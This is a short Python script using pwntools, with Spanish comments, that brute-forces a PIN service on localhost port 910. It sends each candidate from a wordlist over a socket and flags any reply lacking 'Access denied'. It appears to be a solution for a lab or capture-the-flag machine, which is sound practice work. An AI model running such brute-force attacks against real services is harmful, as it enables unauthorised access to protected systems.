#!/bin/python3

from pwn import *
import time

def def_handler(sig, frame):
    print("\n[!] Saliendo...")
    sys.exit(1)

#ctrl + c
signal.signal(signal.SIGINT, def_handler)

def tryPin():
    
    pins = open("diccionario.txt", "r")
    p1 = log.progress("Fuerza bruta")
    p1.status("Comenzando ataque de fuerza bruta")
    
    time.sleep(2)
    counter = 1

    for pin in pins:

        p1.status("Probando con el PIN %s [%s/10000]" % (pin.strip('\n'), str(counter)))

        #creamos un socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #Nos conectamos al puerto
        s.connect(('127.0.0.1', 910))
        #Declaramos el maximo de data que podemos leer
        data = s.recv(4096)
        #Mandamos en forma de bits la data, esto gracias al metodo "encode()"
        s.send(pin.encode())
        #volvemos a declarar el maximo de data a leer.
        data = s.recv(1024)

        if b"Access denied" not in data:
            p1.success("Pin correcto %s" % pin.strip('\n'))
        
        counter += 1
if __name__ == "__main__":
    tryPin()
